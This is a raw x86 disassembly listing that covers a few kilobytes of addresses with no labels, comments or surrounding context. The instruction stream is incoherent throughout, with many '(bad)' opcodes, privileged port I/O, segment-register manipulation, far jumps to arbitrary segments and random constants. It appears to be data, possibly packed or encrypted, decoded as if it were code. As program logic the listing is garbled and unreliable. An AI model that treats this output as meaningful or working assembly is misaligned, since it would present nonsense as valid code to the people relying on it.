  4194e7:	lock xchg DWORD PTR ds:0xc1b98071,edx
  4194ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194f0:	int3   
  4194f1:	(bad)  
  4194f2:	push   edx
  4194f3:	inc    DWORD PTR [ebp+0x32fa15ac]
  4194f9:	mov    edi,eax
  4194fb:	sbb    eax,0x77fcfe7
  419500:	out    0x4d,eax
  419502:	push   esi
  419503:	cdq    
  419504:	xor    BYTE PTR [ecx+0x53abe127],dl
  41950a:	adc    BYTE PTR [ecx],cl
  41950c:	inc    esp
  41950d:	pop    ds
  41950e:	inc    eax
  41950f:	mov    al,0x6f
  419511:	cmp    edi,DWORD PTR [ebp+0x23]
  419514:	jl     0x419553
  419516:	jbe    0x4194c1
  419518:	cmp    bh,ah
  41951a:	fs xchg ebx,eax
  41951c:	sbb    al,0xe7
  41951e:	inc    ecx
  419520:	or     BYTE PTR [edi-0x37c06174],dh
  419526:	jo     0x41951c
  419528:	hlt    
  419529:	xchg   ecx,eax
  41952a:	std    
  41952b:	clc    
  41952c:	cmp    al,BYTE PTR [ebx-0x24]
  41952f:	(bad)  [esi-0x54981b0a]
  419535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419537:	mov    ecx,0x247e2139
  41953c:	out    dx,eax
  41953d:	ficom  DWORD PTR [edx+ebp*8-0x13]
  419541:	dec    esi
  419542:	add    DWORD PTR [edx+0x44e9c960],0x4ebcf411
  41954c:	pop    eax
  41954d:	or     al,BYTE PTR [eax]
  41954f:	in     eax,dx
  419550:	push   0xc11b7065
  419555:	jg     0x419521
  419557:	out    dx,al
  419558:	xchg   ecx,eax
  419559:	out    dx,eax
  41955a:	mov    eax,ds:0x8e19763
  41955f:	(bad)  
  419560:	std    
  419561:	(bad)  
  419562:	push   edx
  419563:	cmp    DWORD PTR [edi-0x58217875],ebp
  419569:	sar    DWORD PTR [edx-0xe],1
  41956c:	neg    DWORD PTR [edx+esi*2]
  41956f:	not    esi
  419571:	add    ebp,DWORD PTR [ecx]
  419573:	mov    WORD PTR [edx-0x21],?
  419576:	fwait
  419577:	mov    ebx,0xe3a47ea2
  41957c:	into   
  41957d:	test   DWORD PTR [edi+0x41],edi
  419580:	(bad)  
  419581:	jecxz  0x4195a1
  419583:	mov    dl,0x21
  419585:	test   DWORD PTR [esi+0x26fb14f9],esp
  41958b:	mov    ds,WORD PTR [ecx+0xf1e9373]
  419591:	sub    eax,DWORD PTR [edi]
  419593:	sbb    edx,esp
  419595:	(bad)  
  419596:	ror    DWORD PTR [ebx-0x755aaf2c],1
  41959c:	into   
  41959d:	les    edi,FWORD PTR ds:0x2e2f2ee9
  4195a3:	cli    
  4195a4:	sub    al,0xdb
  4195a6:	mov    edi,0x714f6293
  4195ab:	imul   edx,DWORD PTR [ecx],0xffffffa8
  4195ae:	adc    al,0xcf
  4195b0:	or     BYTE PTR [ecx],ah
  4195b2:	add    al,0x32
  4195b4:	pop    edi
  4195b5:	jge    0x419566
  4195b7:	mov    fs,WORD PTR [esi]
  4195b9:	xor    BYTE PTR [ebp-0x57cd12e3],0xd
  4195c0:	stos   BYTE PTR es:[edi],al
  4195c1:	(bad)  
  4195c3:	lods   eax,DWORD PTR ds:[esi]
  4195c4:	jp     0x4195e1
  4195c6:	cmp    al,0xca
  4195c8:	mov    ds:0xaf8aabf4,al
  4195cd:	ins    BYTE PTR es:[edi],dx
  4195ce:	loop   0x4195e4
  4195d0:	mov    ds:0xd7faeb8f,al
  4195d5:	mov    DWORD PTR [esi],eax
  4195d7:	push   es
  4195d8:	sub    DWORD PTR [ebx],0x25
  4195db:	or     esp,DWORD PTR [ecx+0x614103d8]
  4195e1:	test   al,0xc2
  4195e3:	cdq    
  4195e4:	bound  eax,QWORD PTR [esi+0x2d]
  4195e7:	(bad)  
  4195e8:	fistp  WORD PTR [edx+0x5e]
  4195eb:	mov    edi,0x9677a577
  4195f0:	shl    esi,cl
  4195f2:	cmp    eax,0x4d367407
  4195f7:	adc    DWORD PTR [esi],edx
  4195f9:	pop    ss
  4195fa:	cwde   
  4195fb:	mov    BYTE PTR [ebx-0x2d7fe6b8],ch
  419601:	int3   
  419602:	daa    
  419603:	mov    ds:0x18668dd0,eax
  419608:	popf   
  419609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41960a:	dec    edx
  41960b:	cmp    DWORD PTR [edx],edi
  41960d:	mov    DWORD PTR [edx+0x38],ecx
  419610:	mov    ch,0xa
  419612:	fnstcw WORD PTR [edi]
  419614:	cmp    DWORD PTR [eax],eax
  419616:	pop    ecx
  419617:	pop    esi
  419618:	cld    
  419619:	sub    bl,BYTE PTR [edi+0x4912ff20]
  41961f:	nop
  419620:	cmp    dh,BYTE PTR [ecx-0x77]
  419623:	and    DWORD PTR [edx+0x39c77a22],0xffffff9c
  41962a:	das    
  41962b:	sub    al,0x69
  41962d:	add    eax,0x2a04bd51
  419632:	adc    eax,0xf39a8231
  419637:	push   ebx
  419638:	fdivr  st(1),st
  41963a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41963b:	pop    ds
  41963c:	inc    esp
  41963d:	mov    ecx,0xae7f6d4a
  419642:	sbb    BYTE PTR [eax],al
  419644:	push   ss
  419645:	fs pop ss
  419647:	xor    BYTE PTR [edx+ebp*8-0x42a2e267],ah
  41964e:	add    dh,BYTE PTR ds:0x3f6de072
  419654:	rol    eax,cl
  419656:	rol    DWORD PTR [edi-0x53a33779],cl
  41965c:	pop    es
  41965d:	xchg   BYTE PTR [esi],bl
  41965f:	(bad)  
  419660:	jb     0x419603
  419662:	mov    bh,0x2c
  419664:	inc    esp
  419665:	sbb    al,0xc2
  419667:	ds add al,0x41
  41966a:	mov    dl,0x1f
  41966c:	fwait
  41966d:	bound  esi,QWORD PTR ds:0x776650d3
  419673:	pop    esp
  419674:	fild   DWORD PTR [esi-0x25]
  419677:	pop    ecx
  419678:	jo     0x41966e
  41967a:	cli    
  41967b:	lods   eax,DWORD PTR ds:[esi]
  41967c:	cmp    eax,0xa791b644
  419681:	and    BYTE PTR [eax+0x38],bh
  419684:	div    BYTE PTR [eax+esi*1+0x662a785e]
  41968b:	mov    DWORD PTR ds:0xe3820f1a,0x7aa034b9
  419695:	adc    eax,0x97d968c
  41969a:	(bad)  
  41969b:	sbb    eax,DWORD PTR [ebx+eiz*2+0x35]
  41969f:	daa    
  4196a0:	pop    edx
  4196a1:	arpl   bp,ax
  4196a3:	xor    DWORD PTR fs:[ebx+edx*4+0x53],0x2f3ba7ee
  4196ac:	loopne 0x419672
  4196ae:	jae    0x4196c1
  4196b0:	lock cmp BYTE PTR [ecx],bh
  4196b3:	imul   cl
  4196b5:	sub    esi,DWORD PTR [ebp+0x6eb31e2e]
  4196bb:	and    edi,DWORD PTR [ebx-0x60]
  4196be:	into   
  4196bf:	stc    
  4196c0:	mov    esp,0x45a45c68
  4196c5:	jnp    0x419657
  4196c7:	push   eax
  4196c8:	int3   
  4196c9:	dec    ecx
  4196ca:	pop    ds
  4196cb:	in     eax,0x96
  4196cd:	inc    BYTE PTR [eax+0x7a886a86]
  4196d3:	jp     0x419656
  4196d5:	xchg   ebp,eax
  4196d6:	stos   BYTE PTR es:[edi],al
  4196d7:	cwde   
  4196d8:	inc    esi
  4196d9:	jbe    0x4196f7
  4196db:	xchg   BYTE PTR [edi-0x1d],bh
  4196de:	xchg   edi,eax
  4196df:	jbe    0x4196e8
  4196e1:	rol    BYTE PTR [edi+0x3e5543b5],cl
  4196e7:	push   edi
  4196e8:	lock and DWORD PTR [esi-0x6d2e7e15],esi
  4196ef:	pop    ss
  4196f0:	pusha  
  4196f1:	jne    0x419763
  4196f3:	mov    WORD PTR [ecx-0x59],?
  4196f6:	scas   eax,DWORD PTR es:[edi]
  4196f7:	xchg   ch,dl
  4196f9:	jp     0x4196a6
  4196fb:	jnp    0x4196b1
  4196fd:	cld    
  4196fe:	fucomp st(2)
  419700:	xor    al,0x34
  419702:	in     eax,0x61
  419704:	in     al,dx
  419705:	std    
  419706:	add    DWORD PTR [ebp-0x37295b09],edx
  41970c:	xchg   ecx,eax
  41970d:	rcr    BYTE PTR [ebx],0xfa
  419710:	mov    al,0x42
  419712:	sbb    ah,BYTE PTR [ebp+0x565ff313]
  419718:	sub    al,0x2e
  41971a:	fdivr  st,st(7)
  41971c:	fld    DWORD PTR [ecx+edi*1+0x59df1386]
  419723:	mov    bl,0xc0
  419725:	leave  
  419726:	or     al,0xc8
  419728:	add    BYTE PTR [edx+0x6c],dl
  41972b:	(bad)  
  41972c:	stos   DWORD PTR es:[edi],eax
  41972d:	xchg   esp,eax
  41972e:	xchg   esi,eax
  41972f:	sbb    ecx,DWORD PTR [ebx-0x28aaa23c]
  419735:	inc    BYTE PTR [ecx]
  419737:	(bad)  
  419738:	out    0xa0,al
  41973a:	adc    DWORD PTR [ebx],ecx
  41973c:	aas    
  41973d:	inc    esi
  41973e:	xchg   esp,eax
  41973f:	jle    0x419757
  419741:	sbb    eax,0xc37bc4e
  419746:	ror    bh,0x26
  419749:	sub    esi,0xffffffc6
  41974c:	(bad)  
  41974e:	scas   eax,DWORD PTR es:[di]
  419750:	xchg   ebx,eax
  419751:	mov    edi,0xad40a93e
  419756:	mov    ch,0xe6
  419758:	mov    edx,0xe2861283
  41975d:	jno    0x4197c1
  41975f:	xor    eax,DWORD PTR [ebx+0x5f]
  419762:	outs   dx,DWORD PTR ds:[esi]
  419763:	inc    esp
  419764:	repz inc edx
  419766:	nop
  419767:	pop    ebx
  419768:	pop    edx
  419769:	push   ecx
  41976a:	or     bl,BYTE PTR [ebp-0x6c05b4b5]
  419770:	mov    cl,0x83
  419772:	in     eax,0xc3
  419774:	mov    cl,0x57
  419776:	jae    0x4197d9
  419778:	pop    eax
  419779:	inc    esp
  41977a:	inc    ecx
  41977b:	push   ss
  41977c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41977d:	fwait
  41977e:	(bad)  
  41977f:	jmp    0x419752
  419781:	test   DWORD PTR gs:[edx-0x950a0bc],ecx
  419788:	in     eax,dx
  419789:	pushf  
  41978a:	and    dh,BYTE PTR [esi-0x6040f259]
  419790:	cmp    eax,0x1f916a9
  419795:	or     BYTE PTR [ecx+0x2b],al
  419798:	rcr    BYTE PTR [edi],1
  41979a:	add    BYTE PTR [esi+0xa25177a],bl
  4197a0:	jmp    0x41972f
  4197a2:	loop   0x419764
  4197a4:	(bad)  
  4197a6:	lock (bad) 
  4197a8:	jecxz  0x41980a
  4197aa:	sbb    bh,BYTE PTR [ebx]
  4197ac:	or     eax,0x44fda366
  4197b1:	and    al,0x16
  4197b3:	push   esi
  4197b4:	jge    0x419756
  4197b6:	daa    
  4197b7:	sub    DWORD PTR [edi-0x4a7d94b3],0x11
  4197be:	lock inc esi
  4197c0:	pop    ss
  4197c1:	pusha  
  4197c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197c3:	fisttp WORD PTR [edi]
  4197c5:	pop    ebx
  4197c6:	jle    0x419819
  4197c8:	rcl    BYTE PTR [ecx-0x60258edf],cl
  4197ce:	sahf   
  4197cf:	test   edx,0x956919a3
  4197d5:	scas   eax,DWORD PTR es:[edi]
  4197d6:	ss jb  0x41977d
  4197d9:	pushf  
  4197da:	push   eax
  4197db:	inc    ebx
  4197dc:	push   esp
  4197dd:	outs   dx,DWORD PTR ds:[esi]
  4197de:	and    DWORD PTR [esi-0x4aa26cff],eax
  4197e4:	or     esi,DWORD PTR [edx-0x80]
  4197e7:	stos   DWORD PTR es:[edi],eax
  4197e8:	adc    DWORD PTR [edx+0x65bb5e89],edi
  4197ee:	inc    esp
  4197ef:	rcr    BYTE PTR [ecx],1
  4197f1:	sbb    BYTE PTR gs:[ebx-0xc],ch
  4197f5:	stos   DWORD PTR es:[edi],eax
  4197f6:	and    al,0xc8
  4197f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197f9:	popa   
  4197fa:	add    BYTE PTR [edx],bl
  4197fc:	sbb    BYTE PTR ds:0x2322824b,bl
  419802:	add    al,0xbc
  419804:	sar    ecx,0xe1
  419807:	sbb    dh,BYTE PTR [esi]
  419809:	push   edx
  41980a:	add    DWORD PTR [edi-0xc],ebx
  41980d:	arpl   cx,ax
  41980f:	ja     0x41985d
  419811:	nop
  419812:	lock mov ds:0xe9c6b070,al
  419818:	inc    ebp
  419819:	fldenv [ebx]
  41981b:	push   0x5e
  41981d:	retf   0x11a3
  419820:	fst    QWORD PTR [eax]
  419822:	sub    ch,BYTE PTR [edx-0x1ef54556]
  419828:	push   esi
  419829:	jb     0x4197bb
  41982b:	retf   0x5fa
  41982e:	mov    dh,0x92
  419830:	xchg   ebx,eax
  419831:	push   cs
  419832:	aam    0xfd
  419834:	lahf   
  419835:	fdiv   st,st(3)
  419837:	stos   DWORD PTR es:[edi],eax
  419838:	pop    ebp
  419839:	aad    0x2e
  41983b:	sub    ah,BYTE PTR [ecx+0x69]
  41983e:	imul   eax,DWORD PTR [edx+0x40],0xffffffb4
  419842:	int3   
  419843:	test   al,0x9a
  419845:	and    al,0x73
  419847:	loopne 0x419800
  419849:	imul   edx,DWORD PTR [ebx],0x1042444f
  41984f:	sub    eax,0x3fb05b88
  419854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419855:	inc    esp
  419856:	jns    0x4198a4
  419858:	js     0x419896
  41985a:	sbb    ebx,DWORD PTR [ecx]
  41985c:	add    eax,0x1cb7db57
  419861:	and    DWORD PTR [eax-0x6e],edi
  419864:	rcr    BYTE PTR [eax-0x160cacd8],0x14
  41986b:	push   eax
  41986c:	jo     0x419802
  41986e:	out    0xb7,al
  419870:	xor    al,0xb2
  419872:	jg     0x4198b6
  419874:	cmp    ebx,0xb7a8da94
  41987a:	aas    
  41987b:	bound  eax,QWORD PTR [edi]
  41987d:	add    DWORD PTR [edi+0x7d],ebx
  419880:	pop    ds
  419881:	pop    ss
  419882:	adc    BYTE PTR [edi-0x76],bl
  419885:	sub    DWORD PTR [esi-0x63bf34df],0xe56fe093
  41988f:	shl    ah,0x4
  419892:	mov    esi,0x9c14873b
  419897:	gs inc edi
  419899:	pusha  
  41989a:	imul   BYTE PTR [eax-0x9]
  41989d:	adc    esp,DWORD PTR [edi-0x1d]
  4198a0:	stos   BYTE PTR es:[edi],al
  4198a1:	stos   WORD PTR es:[edi],ax
  4198a3:	mov    ah,0xf4
  4198a5:	imul   ebx,ecx,0x44
  4198a8:	xchg   ebp,eax
  4198a9:	add    eax,0xbba0090a
  4198ae:	scas   al,BYTE PTR es:[edi]
  4198af:	mov    eax,0x6c6c6894
  4198b4:	add    al,BYTE PTR [ecx-0x35]
  4198b7:	pop    ss
  4198b8:	scas   eax,DWORD PTR es:[edi]
  4198b9:	cmp    bl,0xf
  4198bc:	vprotw xmm0,xmm7,0x4
  4198c1:	test   DWORD PTR [eax+ecx*1+0x2bc0e979],0x7a5573cc
  4198cc:	in     eax,dx
  4198cd:	dec    eax
  4198ce:	adc    DWORD PTR [edi-0x47],esp
  4198d1:	fbstp  TBYTE PTR [edi]
  4198d3:	add    bh,bl
  4198d5:	sahf   
  4198d6:	cmp    DWORD PTR [edx-0x63],ebp
  4198d9:	dec    esi
  4198da:	push   ebp
  4198db:	repnz sub eax,0xb608f374
  4198e1:	loop   0x4198e9
  4198e3:	nop
  4198e4:	cmp    BYTE PTR [ecx],bh
  4198e6:	loope  0x419951
  4198e8:	xlat   BYTE PTR ds:[ebx]
  4198e9:	mov    bl,0x80
  4198eb:	(bad)  
  4198ec:	int3   
  4198ed:	cmp    dh,BYTE PTR ds:[ebp-0x63]
  4198f1:	outs   dx,DWORD PTR ds:[esi]
  4198f2:	lock cmp al,0x49
  4198f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198f6:	pop    es
  4198f7:	lods   eax,DWORD PTR ds:[esi]
  4198f8:	fild   QWORD PTR [edi+0x5904a55a]
  4198fe:	xchg   esp,eax
  4198ff:	pop    edx
  419900:	ja     0x419899
  419902:	jae    0x4198d4
  419904:	sbb    eax,0xc77fc0b6
  419909:	xchg   esi,eax
  41990a:	xchg   DWORD PTR [esi+0x5f92b924],ebp
  419910:	sub    ebx,ebp
  419912:	idiv   BYTE PTR ds:0x4a652a5c
  419918:	enter  0xed41,0xda
  41991c:	sti    
  41991d:	nop
  41991e:	mov    WORD PTR [ecx-0x7c9922f6],fs
  419924:	push   esp
  419925:	xchg   edi,eax
  419926:	or     ebp,ebp
  419928:	es mov esi,0xe0bd0c40
  41992e:	sub    al,BYTE PTR [edx-0x3f4a2214]
  419934:	shr    bl,cl
  419936:	xchg   ebx,eax
  419937:	shl    BYTE PTR [esi-0x3a21773b],cl
  41993d:	jle    0x41998f
  41993f:	hlt    
  419940:	fcomi  st,st(3)
  419942:	mov    DWORD PTR [esi-0x7bccaa0f],ebp
  419948:	dec    edi
  419949:	push   edx
  41994a:	rcr    ecx,cl
  41994c:	push   esi
  41994d:	sbb    eax,0xb013796c
  419952:	push   edi
  419953:	mov    ebx,0x6edc09ba
  419959:	scas   al,BYTE PTR es:[edi]
  41995a:	retf   0xc43c
  41995d:	enter  0x59aa,0x58
  419961:	sbb    BYTE PTR [esi-0x711da4cc],al
  419967:	and    ah,BYTE PTR [esi+0x3999f77d]
  41996d:	mov    al,ds:0xc69cdfdf
  419972:	xchg   DWORD PTR [ecx+0x15cfc6de],esp
  419978:	inc    eax
  419979:	adc    esi,esp
  41997b:	pop    edx
  41997c:	mov    dl,0x34
  41997e:	sbb    esi,DWORD PTR [edx+0x4ecc6b92]
  419984:	fisub  WORD PTR fs:[ecx+ebp*4-0x690ae81a]
  41998c:	inc    esp
  41998d:	bound  eax,QWORD PTR [ebp-0x5f]
  419990:	pop    ss
  419991:	arpl   WORD PTR [esi+0x3f],ax
  419994:	xchg   BYTE PTR [edx-0x62],al
  419997:	in     al,dx
  419998:	lahf   
  419999:	dec    edi
  41999a:	in     eax,0x1f
  41999c:	bound  edi,QWORD PTR [esi-0x42a02ca0]
  4199a2:	xchg   ebp,eax
  4199a3:	or     BYTE PTR [edi],dl
  4199a5:	std    
  4199a6:	lahf   
  4199a7:	sub    DWORD PTR [edx],edi
  4199a9:	outs   dx,DWORD PTR ds:[esi]
  4199aa:	outs   dx,BYTE PTR ds:[esi]
  4199ab:	xchg   esi,eax
  4199ac:	iret   
  4199ad:	pop    es
  4199ae:	mov    ebp,0x4bc1b46d
  4199b3:	shr    BYTE PTR [ebx+0x14],0xd
  4199b7:	call   0x9a83:0xa149f55e
  4199be:	outs   dx,BYTE PTR ds:[esi]
  4199bf:	and    esp,DWORD PTR [esi-0x3a]
  4199c2:	test   eax,0xae09cd76
  4199c7:	and    DWORD PTR [ebp-0x97399a],esp
  4199cd:	fist   DWORD PTR [esi+0x74c206e0]
  4199d3:	pushf  
  4199d4:	sbb    eax,0x46c823bf
  4199d9:	and    esp,DWORD PTR [eax+edx*8]
  4199dc:	ins    DWORD PTR es:[edi],dx
  4199dd:	ds das 
  4199df:	xor    dh,BYTE PTR [ebx]
  4199e1:	push   edx
  4199e2:	test   eax,0x301840ef
  4199e7:	(bad)  
  4199e9:	jno    0x419995
  4199eb:	inc    esi
  4199ec:	pop    ds
  4199ed:	repz adc eax,0x8f8307ae
  4199f3:	mov    ebp,edx
  4199f5:	in     al,dx
  4199f6:	sti    
  4199f7:	push   edx
  4199f8:	mov    bl,0x63
  4199fa:	sbb    DWORD PTR [ecx+0x32388d59],0x4c1cf28e
  419a04:	ins    BYTE PTR es:[edi],dx
  419a05:	ds inc edi
  419a07:	sbb    ch,BYTE PTR [esi]
  419a09:	pushf  
  419a0a:	xchg   esp,eax
  419a0b:	cmp    eax,0x62ebecf4
  419a10:	adc    ecx,esi
  419a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a13:	sbb    ebx,DWORD PTR [esi+0x5e]
  419a16:	shl    BYTE PTR [edx+0x7c],1
  419a19:	jae    0x419a4a
  419a1b:	mov    al,ds:0x8c0d1c9d
  419a20:	xor    eax,DWORD PTR [ecx-0x18]
  419a23:	inc    edx
  419a24:	test   al,0x38
  419a26:	inc    esp
  419a27:	jne    0x419a23
  419a29:	daa    
  419a2a:	clc    
  419a2b:	add    eax,0x9b202fce
  419a30:	sbb    DWORD PTR [eax+0x460820e5],esi
  419a36:	mov    cl,0xf5
  419a38:	inc    esi
  419a39:	lods   al,BYTE PTR ds:[esi]
  419a3a:	adc    eax,DWORD PTR [edi+0x4b]
  419a3d:	jns    0x4199e8
  419a3f:	sbb    BYTE PTR [ebx],bl
  419a41:	add    BYTE PTR [ebx],dh
  419a43:	adc    cl,BYTE PTR [esi]
  419a45:	imul   ecx,DWORD PTR [ebp+0x77],0x705ad1cf
  419a4c:	pop    edx
  419a4d:	rcl    BYTE PTR [ecx+0x4a7e4965],1
  419a53:	(bad)  
  419a54:	cmc    
  419a55:	mov    cl,0x92
  419a57:	retf   0x18e
  419a5a:	je     0x4199e6
  419a5c:	inc    edx
  419a5d:	imul   ebp,DWORD PTR [ecx-0x66d03a26],0x6c22c0ce
  419a67:	xchg   DWORD PTR [edx-0x80],esp
  419a6a:	ja     0x419a08
  419a6c:	leave  
  419a6d:	pop    ecx
  419a6e:	jp     0x419a0c
  419a70:	test   BYTE PTR [eax+0x6c7d6105],al
  419a76:	dec    edx
  419a77:	add    bh,al
  419a79:	inc    ebp
  419a7a:	or     eax,0x6ef988bd
  419a7f:	or     DWORD PTR [esi+0x33c4ba7e],ebp
  419a85:	and    al,cl
  419a87:	xchg   ebx,eax
  419a88:	jb     0x419a65
  419a8a:	in     eax,0x3d
  419a8c:	ret    0xcba
  419a8f:	pop    edi
  419a90:	rcr    DWORD PTR [edx+0x3016cf40],cl
  419a96:	inc    eax
  419a97:	cmp    BYTE PTR [esi+ebx*1-0x29bd954f],dh
  419a9e:	mov    eax,0x9a89b628
  419aa3:	ret    0x3a27
  419aa6:	mov    edi,0x12fcf2eb
  419aab:	imul   DWORD PTR [esi-0x33]
  419aae:	sbb    DWORD PTR [bx+si+0x65],esp
  419ab2:	rcr    DWORD PTR [ebx],0x73
  419ab5:	mov    edx,0xfcfa59b9
  419aba:	and    DWORD PTR [ecx-0x1f],ebp
  419abd:	fbld   TBYTE PTR [eax]
  419abf:	jl     0x419a92
  419ac1:	lock dec esp
  419ac3:	test   DWORD PTR [ebx-0x67],ebp
  419ac6:	aaa    
  419ac7:	(bad)  
  419ac8:	mov    bh,0x23
  419aca:	lock (bad) 
  419acc:	in     eax,dx
  419acd:	inc    esp
  419ace:	ror    bh,1
  419ad0:	popa   
  419ad1:	adc    ch,BYTE PTR [ebp-0x6a]
  419ad4:	jmp    0x4564:0x119d91e0
  419adb:	(bad)  
  419adc:	in     al,0x9f
  419ade:	mov    WORD PTR [edx-0x3d],ds
  419ae1:	jge    0x419a9e
  419ae3:	les    edx,FWORD PTR [edx]
  419ae5:	ja     0x419ab5
  419ae7:	aad    0x70
  419ae9:	push   cs
  419aea:	ret    0xc33b
  419aed:	push   esp
  419aee:	outs   dx,BYTE PTR ds:[esi]
  419aef:	pop    esi
  419af0:	outs   dx,BYTE PTR ds:[esi]
  419af1:	mov    dl,0x4
  419af3:	mov    esi,0xc74eb6b0
  419af8:	pop    es
  419af9:	sub    al,0xff
  419afb:	sbb    eax,0x97e51a3
  419b00:	xor    eax,0xee6264d2
  419b05:	mov    al,ds:0xe8bf0bf0
  419b0a:	in     eax,0x40
  419b0c:	lods   eax,DWORD PTR ds:[esi]
  419b0d:	sub    ecx,0x67
  419b10:	(bad)  
  419b11:	push   ebx
  419b12:	hlt    
  419b13:	jo     0x419b7e
  419b15:	lods   al,BYTE PTR ds:[esi]
  419b16:	pop    ebx
  419b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b18:	jns    0x419a9f
  419b1a:	mov    esi,0x99c2f120
  419b1f:	pop    es
  419b20:	lods   eax,DWORD PTR ds:[esi]
  419b21:	and    edi,DWORD PTR ds:0x204b61f0
  419b27:	add    al,0x5b
  419b29:	in     al,0x37
  419b2b:	les    edx,FWORD PTR [edx+0xe3dbae8]
  419b31:	lock test DWORD PTR [edi],edx
  419b34:	inc    ecx
  419b35:	dec    ebp
  419b36:	aas    
  419b37:	call   DWORD PTR [ebx]
  419b39:	mov    eax,ds:0x152ca897
  419b3e:	jmp    0x419b32
  419b40:	push   0x5a
  419b42:	(bad)  
  419b43:	out    dx,eax
  419b44:	(bad)  
  419b46:	enter  0x94f9,0xf7
  419b4a:	vpaddsw ymm6,ymm6,YMMWORD PTR [ebx]
  419b4e:	inc    ebx
  419b4f:	inc    ecx
  419b50:	mov    cl,BYTE PTR [ebx-0xe7627bc]
  419b56:	sbb    al,0x8b
  419b58:	adc    al,0x33
  419b5a:	xor    al,0x5e
  419b5c:	shl    BYTE PTR [edx+0x38215e7a],cl
  419b62:	adc    edx,DWORD PTR ds:[eax-0x6cf4e5c1]
  419b69:	pop    ebx
  419b6a:	sub    DWORD PTR [ebx+0xa],ebx
  419b6d:	addr16 jae 0x419b35
  419b70:	sub    eax,0xa6c3365e
  419b75:	cld    
  419b76:	cmp    dl,BYTE PTR [esi-0x64b379e3]
  419b7c:	push   es
  419b7d:	inc    BYTE PTR [ebx+0x332eccd2]
  419b83:	outs   dx,BYTE PTR ds:[esi]
  419b84:	pop    es
  419b85:	mov    cl,0x5f
  419b87:	cmc    
  419b88:	cmc    
  419b89:	enter  0x3c18,0x40
  419b8d:	xchg   esi,eax
  419b8e:	ficom  DWORD PTR [edi-0x114d5b47]
  419b94:	sbb    al,0x9b
  419b96:	xchg   ebp,eax
  419b97:	jb     0x419ba2
  419b99:	iret   
  419b9a:	push   esp
  419b9b:	ftst   
  419b9d:	inc    eax
  419b9e:	inc    eax
  419b9f:	ror    BYTE PTR [esi-0x48cbea93],1
  419ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ba6:	add    BYTE PTR [edx+0x17],0x7d
  419baa:	lods   al,BYTE PTR ds:[esi]
  419bab:	sbb    eax,ecx
  419bad:	pop    esp
  419bae:	shr    ecx,1
  419bb0:	in     al,dx
  419bb1:	push   DWORD PTR [edi-0x25]
  419bb4:	or     DWORD PTR ds:0xf08c2722,esp
  419bba:	les    edi,FWORD PTR ds:0x48e97180
  419bc0:	enter  0x3270,0x70
  419bc4:	mov    edx,0xe552c087
  419bc9:	(bad)  
  419bca:	mov    ds:0x2ac99323,eax
  419bcf:	in     eax,0x13
  419bd1:	loopne 0x419c2e
  419bd3:	jl     0x419bb8
  419bd5:	out    dx,al
  419bd6:	das    
  419bd7:	jmp    0x6948a460
  419bdc:	into   
  419bdd:	scas   eax,DWORD PTR es:[edi]
  419bde:	sti    
  419bdf:	add    bh,BYTE PTR [edi+0x9]
  419be2:	add    ebp,ecx
  419be4:	sar    DWORD PTR [ecx-0x1c],0xd8
  419be8:	in     al,dx
  419be9:	ins    DWORD PTR es:[edi],dx
  419bea:	and    BYTE PTR [ebx],al
  419bec:	mov    ch,0x9f
  419bee:	ret    
  419bef:	repz jmp 0x1780dfde
  419bf5:	adc    al,0x41
  419bf7:	jne    0x419b87
  419bf9:	adc    BYTE PTR ds:0x96a8f107,ch
  419bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c00:	int    0x1f
  419c02:	push   0xffffffa0
  419c04:	mov    eax,0x607e305e
  419c09:	mulps  xmm7,XMMWORD PTR [eax]
  419c0c:	xchg   BYTE PTR [esi-0x675741be],ah
  419c12:	inc    eax
  419c13:	xchg   DWORD PTR [edx],ebx
  419c15:	sub    eax,0xb793d7b1
  419c1a:	call   0xb8ed3075
  419c1f:	push   es
  419c20:	inc    eax
  419c21:	fidivr DWORD PTR [esi-0x7acd3497]
  419c28:	xlat   BYTE PTR ds:[ebx]
  419c29:	inc    ebp
  419c2a:	sbb    DWORD PTR [ebx],0xffffffbc
  419c2d:	sbb    al,cl
  419c2f:	aas    
  419c30:	sub    BYTE PTR [ebx+0x37b4bcf8],ah
  419c36:	jmp    0x419cb2
  419c38:	aad    0xbf
  419c3a:	rdpmc  
  419c3c:	dec    edi
  419c3d:	gs pop ebx
  419c3f:	inc    edx
  419c40:	repnz mov eax,0xe11d2a51
  419c46:	fistp  WORD PTR [ecx-0x5d76290]
  419c4c:	ss pop ecx
  419c4e:	in     eax,0x62
  419c50:	jp     0x419c32
  419c52:	pushf  
  419c53:	mov    ss,eax
  419c55:	scas   eax,DWORD PTR es:[edi]
  419c56:	add    al,0x72
  419c58:	call   0x589eb498
  419c5d:	inc    ecx
  419c5e:	mov    esi,0xf8a42fd5
  419c63:	add    ebx,DWORD PTR [ecx]
  419c65:	mov    ecx,0x742ca336
  419c6a:	adc    BYTE PTR [esi+0x29],bl
  419c6d:	mov    edx,DWORD PTR [ecx+0x22]
  419c70:	loopne 0x419c19
  419c72:	out    dx,eax
  419c73:	test   eax,0x44ebb121
  419c78:	cmp    al,0x49
  419c7a:	cmp    edi,edx
  419c7c:	fwait
  419c7d:	jo     0x419c57
  419c7f:	mov    esp,0xe08d8690
  419c84:	adc    ah,BYTE PTR [eax-0x31]
  419c87:	bound  ebp,QWORD PTR [eax-0x1f7bf9a]
  419c8d:	mov    ds:0xc4afbd1a,al
  419c92:	pop    ds
  419c93:	mul    DWORD PTR [edi-0x340d9a28]
  419c99:	mov    bl,0x3d
  419c9b:	xchg   edx,eax
  419c9c:	ftst   
  419c9e:	fisttp DWORD PTR [eax+ecx*1-0x45aae62f]
  419ca5:	mov    bl,0xbd
  419ca7:	jmp    0xe0a0:0xb116ced5
